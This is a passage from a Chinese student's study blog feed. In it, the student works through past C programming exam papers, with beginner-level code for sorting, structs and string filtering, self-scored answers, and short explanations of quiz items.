class="keyword">int</span> i = <span class="number">0</span>; i &lt; N; i++) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;请输入第%d个学生的姓名和成绩:&quot;</span>,i+<span class="number">1</span>);</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%s%d&quot;</span>,&amp;arr[i].name,&amp;arr[i].data);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//排序</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">Student</span> <span class="title">buff</span>;</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; N  ; i++) &#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> j = i + <span class="number">1</span>; j &lt; N; j++) &#123;</span><br><span class="line">			<span class="keyword">if</span> (arr[i].data &lt; arr[j].data) &#123;</span><br><span class="line">				buff = arr[i];</span><br><span class="line">				arr[i] = arr[j];</span><br><span class="line">				arr[j] = buff;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//存放最大的成绩的人</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">Student</span> <span class="title">max</span>[4];</span></span><br><span class="line">	max[<span class="number">0</span>] = arr[<span class="number">0</span>];</span><br><span class="line">	<span class="keyword">int</span> bf = <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; N; i++) &#123;</span><br><span class="line">		<span class="keyword">if</span> (arr[<span class="number">0</span>].data == arr[i].data) &#123;</span><br><span class="line">			max[bf] = arr[i];</span><br><span class="line">			bf++;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; bf; i++) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;\n成绩最大的人有：%s,分数为%d&quot;</span>, max[i].name, max[i].data);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//</span></span><br></pre></td></tr></table></figure>

<p>很好！看最后一道题</p>
<h2 id="26"><a href="#26" class="headerlink" title="26"></a>26</h2><p><img src="/2023/09/21/2019%E5%B9%B4%E7%9C%9F%E9%A2%98%E8%A7%A3%E6%9E%90/image-20230921103128821-1695265255993.png" alt="image-20230921103128821"></p>
<p>这道题是什么意思，意思就是要求你学生手搓冒泡排序捏。我再来试试吧（又轮到猫鼬小粥的歌了，真的好好听，以前高中就是听这些挺过来的，😋考研也是）</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">show</span><span class="params">(<span class="keyword">int</span> <span class="built_in">array</span>[<span class="number">10</span>])</span> </span>&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, <span class="built_in">array</span>[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sort</span><span class="params">(<span class="keyword">int</span> <span class="built_in">array</span>[<span class="number">10</span>])</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> temp = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">9</span>; j &gt; <span class="number">0</span>; j--) &#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; j; i++) &#123;</span><br><span class="line">			<span class="keyword">if</span> (<span class="built_in">array</span>[i] &gt; <span class="built_in">array</span>[i + <span class="number">1</span>]) &#123;</span><br><span class="line">				temp = <span class="built_in">array</span>[i];</span><br><span class="line">				<span class="built_in">array</span>[i] = <span class="built_in">array</span>[i+<span class="number">1</span>];</span><br><span class="line">				<span class="built_in">array</span>[i + <span class="number">1</span>] = temp;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> a[<span class="number">10</span>] = &#123; <span class="number">3</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">9</span> &#125;;</span><br><span class="line">	show(a);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;排序之后捏&quot;</span>);</span><br><span class="line">	sort(a);</span><br><span class="line">	show(a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>很好已经搓了一个冒泡，然后就不会了。看看学长的答案吧</p>
<p>我草我好纯，根本没想到用现成的函数，我想起来了。那节课我睡着了😅</p>
<p><strong>这道题意思应该是输入10个字符串，然后用strcmp函数来排序,strcpy复制交换字符串</strong></p>
<p>现在要补的就是两节，字符串相关函数，位运算相关的知识。</p>
<p>在C语言中，<code>strcmp</code>函数用于比较字符串str1和str2是否相同。其语法结构为：<code>int strcmp(char *str1, char *str2)</code>。如果str1的字符大于str2的字符，则返回负1；如果相同则返回0。</p>
<p><code>char * strcpy( char * dst, const char * src );</code>这个函数把字符串src复制到一分配好的字符串空间dst中，复制的时候包括标志字符串结尾的空字符一起复制。</p>
<p>我还以为要手搓挨个字母挨个字母进行对比呢。。。。我是蠢b🥲</p>
]]></content>
      <categories>
        <category>-c</category>
      </categories>
  </entry>
  <entry>
    <title>2018年真题解析</title>
    <url>/2023/10/05/2018%E5%B9%B4%E7%9C%9F%E9%A2%98%E8%A7%A3%E6%9E%90/</url>
    <content><![CDATA[<h1 id="2018年真题解析"><a href="#2018年真题解析" class="headerlink" title="2018年真题解析"></a>2018年真题解析</h1><p>网安的概念还有几十页要背，好好背一下好了。唉，考研是真的好痛苦啊。</p>
<h1 id="临时存答案"><a href="#临时存答案" class="headerlink" title="临时存答案"></a>临时存答案</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">一、单选题</span><br><span class="line">1.A 2.C 3.A 4.D 5.A</span><br><span class="line">6.C 7.B 8.C 9.C 10.B</span><br><span class="line">//正确答案BCADA DBCCB  错两个，得16分</span><br><span class="line">二、判断题</span><br><span class="line">对对对错对</span><br><span class="line">错错错对错</span><br><span class="line">//我的就是正确答案！得20分</span><br><span class="line">三、程序分析题</span><br><span class="line">21.</span><br><span class="line">程序功能：判断每个字母分别出现了几次，不区分大小写</span><br><span class="line">程序运行结果：</span><br><span class="line">A-2</span><br><span class="line">E-1</span><br><span class="line">G-1</span><br><span class="line">H-1</span><br><span class="line">I-2</span><br><span class="line">K-1</span><br><span class="line">M-1</span><br><span class="line">O-2</span><br><span class="line">P-1</span><br><span class="line">R-2</span><br><span class="line">S-3</span><br><span class="line">T-3</span><br><span class="line">//全对10分！</span><br><span class="line">22.</span><br><span class="line">程序功能：判断数组中成绩最高的学生和成绩最低的学生，并分别输出分数最大的学生和分数最小的学生的姓名和成绩。</span><br><span class="line">程序运行结果：</span><br><span class="line">Max is:Wanghai,93</span><br><span class="line">Min is:Liuhong,62</span><br><span class="line">//全对10分！</span><br><span class="line">23.</span><br><span class="line">程序功能：将一个正整数倒置</span><br><span class="line">程序运行结果：result:54321</span><br><span class="line">//全对10分！</span><br></pre></td></tr></table></figure>

<p>四、程序设计题</p>
<p>24.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i,j;</span><br><span class="line">	<span class="keyword">int</span> re;</span><br><span class="line">	<span class="keyword">for</span>(j=<span class="number">1</span>;j&lt;=<span class="number">9</span>;j++)&#123;</span><br><span class="line">		<span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=j;i++)&#123;</span><br><span class="line">			re=j*i;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%d*%d=%d   &quot;</span>,j,i,re);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>//能完成功能，我就算25分吧</p>
<p>25.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">person</span> &#123;</span></span><br><span class="line">		<span class="keyword">char</span> name[<span class="number">20</span>];</span><br><span class="line">		<span class="keyword">int</span> sex;<span class="comment">//男人为0，女人为1</span></span><br><span class="line">		<span class="keyword">int</span> age;</span><br><span class="line">	&#125;arr[<span class="number">100</span>];</span><br><span class="line">	<span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span> (i &lt; <span class="number">100</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;请输入第%d位人的姓名，性别（其中男人为0，女人为1）和年龄:\n&quot;</span>, i+<span class="number">1</span>);</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%s%d%d&quot;</span>, &amp;arr[i].name, &amp;arr[i].sex, &amp;arr[i].age);</span><br><span class="line">		i++;</span><br><span class="line">	&#125;<span class="comment">//接收</span></span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">person</span> <span class="title">tee</span>[100], <span class="title">adult</span>[100], <span class="title">old</span>[100];</span></span><br><span class="line">	<span class="keyword">int</span> t = <span class="number">0</span>; <span class="keyword">int</span> a = <span class="number">0</span>; <span class="keyword">int</span> o = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++) &#123;</span><br><span class="line">		<span class="keyword">if</span> (( - <span class="number">1</span> &lt; arr[i].age) &amp;&amp; (arr[i].age&lt; <span class="number">30</span>)) &#123;</span><br><span class="line">			tee[t] = arr[i];</span><br><span class="line">			t++;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> ((<span class="number">29</span> &lt; arr[i].age) &amp;&amp; (arr[i].age &lt; <span class="number">60</span>)) &#123;</span><br><span class="line">			adult[a] = arr[i];</span><br><span class="line">			a++;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (arr[i].age &gt;= <span class="number">60</span>) &#123;</span><br><span class="line">			old[o] = arr[i];</span><br><span class="line">			o++;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;年轻人有%d，中年人有%d，老年人有%d&quot;</span>, t, a, o);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>//能完成功能，我就算25分吧</p>
<p>26.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">char</span> arr1[<span class="number">50</span>];</span><br><span class="line">	<span class="keyword">char</span> arr2[<span class="number">50</span>];</span><br><span class="line">	<span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> j = <span class="number">0</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;请输入字符串1\n&quot;</span>);</span><br><span class="line">	gets_s(arr1);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">char</span> a = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">	<span class="keyword">char</span> b = <span class="string">&#x27;9&#x27;</span>;</span><br><span class="line">	<span class="keyword">while</span> (arr1[i] != <span class="string">&#x27;\0&#x27;</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span> ((arr1[i] &gt;= a) &amp;&amp; (arr1[i] &lt;= b)) &#123;</span><br><span class="line">			arr1[i] == a;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (arr1[i] != a) &#123;</span><br><span class="line">			arr2[j] = arr1[i];</span><br><span class="line">			j++;</span><br><span class="line">			i++;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			i++;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> lenth = <span class="number">0</span>;</span><br><span class="line">	lenth = <span class="built_in">strlen</span>(arr2);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;字符串2为：&quot;</span>);</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; lenth; i++) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, arr2[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>未完成，我直接算0分好吧</p>
<p>这次总分116分！重点其实就是编程题，我要是最后一个编程题对了，基本上就是130分左右，但是好难啊，我两次编程题都没写对，所以要对编程题进行针对性的训练。</p>
<h1 id="解析"><a href="#解析" class="headerlink" title="解析"></a>解析</h1><h1 id="填空题"><a href="#填空题" class="headerlink" title="填空题"></a>填空题</h1><h2 id="1"><a href="#1" class="headerlink" title="1"></a>1</h2><p><img src="/2023/10/05/2018%E5%B9%B4%E7%9C%9F%E9%A2%98%E8%A7%A3%E6%9E%90/image-20231004182136763.png" alt="image-20231004182136763"></p>
<p>这道题我都能选错是我没想到的，脑子抽了。。</p>
<p>逻辑或是有一个是真的就是真的，所以选B</p>
<h2 id="2"><a href="#2" class="headerlink" title="2"></a>2</h2><p><img src="/2023/10/05/2018%E5%B9%B4%E7%9C%9F%E9%A2%98%E8%A7%A3%E6%9E%90/image-20231004182611730.png" alt="image-20231004182611730"></p>
<p>选C</p>
<h2 id="3"><a href="#3" class="headerlink" title="3"></a>3</h2><p><img src="/2023/10/05/2018%E5%B9%B4%E7%9C%9F%E9%A2%98%E8%A7%A3%E6%9E%90/image-20231004182625830.png" alt="image-20231004182625830"></p>
<p>选A</p>
<p>C语言源文件后缀名是“.c”，编译（就是将源代码转换为机器语言。编译器的输出结果成为目标代码，存放它们的文件称为目标文件）生成的文件后缀名是“.obj”，连接后可执行文件的后缀名是“.exe”。<br>而最后的cpp后缀，是c++的源文件。</p>
<h2 id="4"><a href="#4" class="headerlink" title="4"></a>4</h2><p><img src="/2023/10/05/2018%E5%B9%B4%E7%9C%9F%E9%A2%98%E8%A7%A3%E6%9E%90/image-20231004182933228.png" alt="image-20231004182933228"></p>
<p>最后一个只是单纯的表达式，并不具备赋值的功能。<br>选D</p>
<h2 id="5"><a href="#5" class="headerlink" title="5"></a>5</h2><p><img src="/2023/10/05/2018%E5%B9%B4%E7%9C%9F%E9%A2%98%E8%A7%A3%E6%9E%90/image-20231004183005784.png" alt="image-20231004183005784"></p>
<p>这个是老生常谈了，选A</p>
<h2 id="6"><a href="#6" class="headerlink" title="6"></a>6</h2><p><img src="/2023/10/05/2018%E5%B9%B4%E7%9C%9F%E9%A2%98%E8%A7%A3%E6%9E%90/image-20231004183026483.png" alt="image-20231004183026483"></p>
<p>这个我还是真是触及到知识盲区了，我一直以为是3能省略，结果是全部都可以省略,但表达式之间的间隔符 ( 分号 )不能缺省。<code>for(;;)</code>的功能就和while(1)一样了<br>选D</p>
<h2 id="7"><a href="#7" class="headerlink" title="7"></a>7</h2><p><img src="/2023/10/05/2018%E5%B9%B4%E7%9C%9F%E9%A2%98%E8%A7%A3%E6%9E%90/image-20231004183740621.png" alt="image-20231004183740621"></p>
<p>判断长度当然使用strlen函数啦<br>选B</p>
<h2 id="8"><a href="#8" class="headerlink" title="8"></a>8</h2><p><img src="/2023/10/05/2018%E5%B9%B4%E7%9C%9F%E9%A2%98%E8%A7%A3%E6%9E%90/image-20231004183848474.png" alt="image-20231004183848474"></p>
<p>老生常谈的问题了，不说了，选C</p>
<h2 id="9"><a href="#9" class="headerlink" title="9"></a>9</h2><p><img src="/2023/10/05/2018%E5%B9%B4%E7%9C%9F%E9%A2%98%E8%A7%A3%E6%9E%90/image-20231005133809796.png" alt="image-20231005133809796"></p>
<p>定义结构体，太基础啦！首先必不可少的就是struct，后面的结构体名称和变量名都是可以省略的，然后前面的结构体名称是不能使用数组的，所以最后答案就选C</p>
<h2 id="10"><a href="#10" class="headerlink" title="10"></a>10</h2><p><img src="/2023/10/05/2018%E5%B9%B4%E7%9C%9F%E9%A2%98%E8%A7%A3%E6%9E%90/image-20231005134540301.png" alt="image-20231005134540301"></p>
<p>首先是输入，所以排除A，如果要直接接收数组的话，scanf直接用数组名即可，gets也是直接用数组名即可，但是gets里面是不能打引号的，所以这道题选B</p>
<h1 id="判断题"><a href="#判断题" class="headerlink" title="判断题"></a>判断题</h1><h2 id="11"><a href="#11" class="headerlink" title="11"></a>11</h2><p><img src="/2023/10/05/2018%E5%B9%B4%E7%9C%9F%E9%A2%98%E8%A7%A3%E6%9E%90/image-20231005135432175.png" alt="image-20231005135432175"></p>
<p>对的</p>
<h2 id="12"><a href="#12" class="headerlink" title="12"></a>12</h2><p><img src="/2023/10/05/2018%E5%B9%B4%E7%9C%9F%E9%A2%98%E8%A7%A3%E6%9E%90/image-20231005135448133.png" alt="image-20231005135448133"></p>
<p>对的</p>
<h2 id="13"><a href="#13" class="headerlink" title="13"></a>13</h2><p><img src="/2023/10/05/2018%E5%B9%B4%E7%9C%9F%E9%A2%98%E8%A7%A3%E6%9E%90/image-20231005135455889.png" alt="image-20231005135455889"></p>
<p>对的</p>
<h2 id="14"><a href="#14" class="headerlink" title="14"></a>14</h2><p><img src="/2023/10/05/2018%E5%B9%B4%E7%9C%9F%E9%A2%98%E8%A7%A3%E6%9E%90/image-20231005135511505.png" alt="image-20231005135511505"></p>
<p>错的，定义数组要使用方括号，定义函数的时候才使用圆括号，且圆括号中的形参也不能以数字开头。</p>
<h2 id="15"><a href="#15" class="headerlink" title="15"></a>15</h2><p><img src="/2023/10/05/2018%E5%B9%B4%E7%9C%9F%E9%A2%98%E8%A7%A3%E6%9E%90/image-20231005135554642.png" alt="image-20231005135554642"></p>
<p>对的</p>
<h2 id="16"><a href="#16" class="headerlink" title="16"></a>16</h2><p><img src="/2023/10/05/2018%E5%B9%B4%E7%9C%9F%E9%A2%98%E8%A7%A3%E6%9E%90/image-20231005135608260.png" alt="image-20231005135608260"></p>
<p>错的，应该如下，p=a</p>
<p><img src="/2023/10/05/2018%E5%B9%B4%E7%9C%9F%E9%A2%98%E8%A7%A3%E6%9E%90/image-20231005135705681.png" alt="image-20231005135705681"></p>
<h2 id="17"><a href="#17" class="headerlink" title="17"></a>17</h2><p><img src="/2023/10/05/2018%E5%B9%B4%E7%9C%9F%E9%A2%98%E8%A7%A3%E6%9E%90/image-20231005135725130.png" alt="image-20231005135725130"></p>
<p>错误的，viod函数不需要return的返回值</p>
<h2 id="18"><a href="#18" class="headerlink" title="18"></a>18</h2><p><img src="/2023/10/05/2018%E5%B9%B4%E7%9C%9F%E9%A2%98%E8%A7%A3%E6%9E%90/image-20231005135745158.png" alt="image-20231005135745158"></p>
<p>错误的，是按照从上到下执行的</p>
<h2 id="19"><a href="#19" class="headerlink" title="19"></a>19</h2><p><img src="/2023/10/05/2018%E5%B9%B4%E7%9C%9F%E9%A2%98%E8%A7%A3%E6%9E%90/image-20231005135815722.png" alt="image-20231005135815722"></p>
<p>正确的</p>
<p><img src="/2023/10/05/2018%E5%B9%B4%E7%9C%9F%E9%A2%98%E8%A7%A3%E6%9E%90/image-20231005140832833.png" alt="image-20231005140832833"></p>
<p>viod指针就能做到这一点，但是后面却无法正确间接寻址，原因是void指针必须要进行转换之后，才能进行正确的引用</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">char</span> arr[<span class="number">5</span>] = <span class="string">&quot;arrs&quot;</span>;</span><br><span class="line">	<span class="keyword">int</span> arr2[<span class="number">5</span>] = &#123; <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span> &#125;;</span><br><span class="line">	<span class="keyword">void</span>* p;</span><br><span class="line">	p = &amp;arr[<span class="number">1</span>];  <span class="comment">// 指向字符数组的第二个元素</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%c\n&quot;</span>, *(<span class="keyword">char</span>*)p);  <span class="comment">// 打印字符数组的第二个元素</span></span><br><span class="line">	p = &amp;arr2[<span class="number">1</span>];  <span class="comment">// 指向整数数组的第二个元素</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, *(<span class="keyword">int</span>*)p);  <span class="comment">// 打印整数数组的第二个元素</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/10/05/2018%E5%B9%B4%E7%9C%9F%E9%A2%98%E8%A7%A3%E6%9E%90/image-20231005141250833.png" alt="image-20231005141250833"></p>
<h2 id="20"><a href="#20" class="headerlink" title="20"></a>20</h2><p><img src="/2023/10/05/2018%E5%B9%B4%E7%9C%9F%E9%A2%98%E8%A7%A3%E6%9E%90/image-20231005141318466.png" alt="image-20231005141318466"></p>
<p>肯定是错误的啦，变量E等于1的时候才执行，而后面是变量E等于0的时候才执行.</p>
<h1 id="程序分析题"><a href="#程序分析题" class="headerlink" title="程序分析题"></a>程序分析题</h1><h2 id="21"><a href="#21" class="headerlink" title="21"></a>21</h2><p><img src="/2023/10/05/2018%E5%B9%B4%E7%9C%9F%E9%A2%98%E8%A7%A3%E6%9E%90/image-20231005141535365.png" alt="image-20231005141535365"></p>
<p>这些分析题我就不解释了，毕竟我都全对，直接看我之前写的答案就好了<br>值得注意的一点就是，程序中的printf必须要好好的看，避免漏过一些重要的输出内容。</p>
<h2 id="22"><a href="#22" class="headerlink" title="22"></a>22</h2><p><img src="/2023/10/05/2018%E5%B9%B4%E7%9C%9F%E9%A2%98%E8%A7%A3%E6%9E%90/image-20231005142350476.png" alt="image-20231005142350476"></p>
<h2 id="23"><a href="#23" class="headerlink" title="23"></a>23</h2><img src="/2023/10/05/2018%E5%B9%B4%E7%9C%9F%E9%A2%98%E8%A7%A3%E6%9E%90/一些笔记\c语言\2018年真题解析\image-20231005142402355.png" alt="image-20231005142402355" style="zoom:150%;">

<h1 id="编程题"><a href="#编程题" class="headerlink" title="编程题"></a>编程题</h1><p>不多解释了，前面两个看我的答案就可以了，现在说说第三个</p>
<h2 id="24-25"><a href="#24-25" class="headerlink" title="24-25"></a>24-25</h2><p><img src="/2023/10/05/2018%E5%B9%B4%E7%9C%9F%E9%A2%98%E8%A7%A3%E6%9E%90/image-20231005143304921.png" alt="image-20231005143304921"></p>
<h2 id><a href="#" class="headerlink" title></a></h2><h2 id="26"><a href="#26" class="headerlink" title="26"></a>26</h2><p><img src="/2023/10/05/2018%E5%B9%B4%E7%9C%9F%E9%A2%98%E8%A7%A3%E6%9E%90/image-20231005143317971.png" alt="image-20231005143317971"></p>
<p>我的思路是，首先接收字符串1和2，然后遍历字符串1，遇到0~9之间的元素就跳过，其他时候直接存入字符串2</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="comment">// 定义两个字符数组，arr1用于接收输入，arr2用于存储非数字字符</span></span><br><span class="line">	<span class="keyword">char</span> arr1[<span class="number">50</span>];</span><br><span class="line">	<span class="keyword">char</span> arr2[<span class="number">50</span>] = &#123;<span class="string">&quot;&quot;</span>&#125;;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 从用户那里获取字符串，并存入arr1</span></span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, arr1);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 计算输入字符串的长度</span></span><br><span class="line">	<span class="keyword">int</span> len = <span class="built_in">strlen</span>(arr1);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 初始化索引变量j</span></span><br><span class="line">	<span class="keyword">int</span> j = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 遍历输入字符串中的每个字符</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">		<span class="comment">// 如果当前字符是数字，则打印提示信息并跳过</span></span><br><span class="line">		<span class="keyword">if</span> (arr1[i] &gt;= <span class="string">&#x27;0&#x27;</span> &amp;&amp; arr1[i] &lt;= <span class="string">&#x27;9&#x27;</span>) &#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;排除%c!\n&quot;</span>, arr1[i]);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="comment">// 如果当前字符不是数字，则将其添加到arr2，并增加索引j</span></span><br><span class="line">			arr2[j] = arr1[i];</span><br><span class="line">			j++;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 计算arr2的长度</span></span><br><span class="line">	<span class="keyword">int</span> len2;</span><br><span class="line">	len2 = <span class="built_in">strlen</span>(arr2);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 打印出arr2中的所有字符</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, arr2[i]);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p><img src="/2023/10/05/2018%E5%B9%B4%E7%9C%9F%E9%A2%98%E8%A7%A3%E6%9E%90/image-20231005144842718.png" alt="image-20231005144842718"></p>
]]></content>
      <categories>
        <category>-c</category>
      </categories>
  </entry>
  <entry>
    <title>20年三道编程大题</title>
    <url>/2023/10/21/20%E5%B9%B4%E4%B8%89%E9%81%93%E7%BC%96%E7%A8%8B%E5%A4%A7%E9%A2%98/</url>
    <content><![CDATA[<h1 id="20年三道编程大题"><a href="#20年三道编程大题" class="headerlink" title="20年三道编程大题"></a>20年三道编程大题</h1><p>题库有些简单，换新的题来写一下，自从20年之后，专业课难度感觉直线飙升啊。</p>
<h1 id="第一题-字符串中找出英文数组"><a href="#第一题-字符串中找出英文数组" class="headerlink" title="第一题-字符串中找出英文数组"></a>第一题-字符串中找出英文数组</h1><p><img src="/2023/10/21/20%E5%B9%B4%E4%B8%89%E9%81%93%E7%BC%96%E7%A8%8B%E5%A4%A7%E9%A2%98/image-20231011225540518.png" alt="image-20231011225540518"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fun</span><span class="params">(<span class="keyword">char</span> str[], <span class="keyword">char</span> *p)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> len;</span><br><span class="line">	len = <span class="built_in">strlen</span>(str);</span><br><span class="line">	<span class="keyword">char</span> item;</span><br><span class="line">	<span class="keyword">int</span> cishu = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">		<span class="keyword">if</span> (((<span class="string">&#x27;a&#x27;</span> &lt;= str[i]) &amp;&amp; (<span class="string">&#x27;z&#x27;</span> &gt;= str[i])) || ((<span class="string">&#x27;A&#x27;</span> &lt;= 